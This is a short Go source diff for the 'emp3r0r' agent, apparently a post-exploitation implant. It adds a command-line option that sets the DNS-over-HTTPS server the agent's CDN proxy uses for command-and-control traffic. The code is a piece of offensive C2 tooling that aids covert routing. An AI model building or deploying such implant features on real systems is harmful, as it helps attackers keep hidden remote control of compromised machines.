@@ -19,6 +19,7 @@ import (
 func main() {
 	c2proxy := flag.String("proxy", "", "Proxy for emp3r0r agent's C2 communication")
 	cdnProxy := flag.String("cdnproxy", "", "CDN proxy for emp3r0r agent's C2 communication")
+	doh := flag.String("doh", "", "DNS over HTTPS server for CDN proxy's DNS requests")
 	silent := flag.Bool("silent", false, "Suppress output")
 	daemon := flag.Bool("daemon", false, "Daemonize")
 	flag.Parse()
@@ -100,8 +101,14 @@ func main() {
 	// if user wants to use CDN proxy
 	if *cdnProxy != "" {
 		go func() {
+			// DoH server
+			dns := "https://9.9.9.9/dns-query"
+			if *doh != "" {
+				dns = *doh
+			}
+
 			// you can change DoH server here if needed
-			err := cdn2proxy.StartProxy("127.0.0.1:10888", *cdnProxy, "https://9.9.9.9/dns-query")
+			err := cdn2proxy.StartProxy("127.0.0.1:10888", *cdnProxy, dns)
 			if err != nil {
 				log.Fatal(err)
 			}
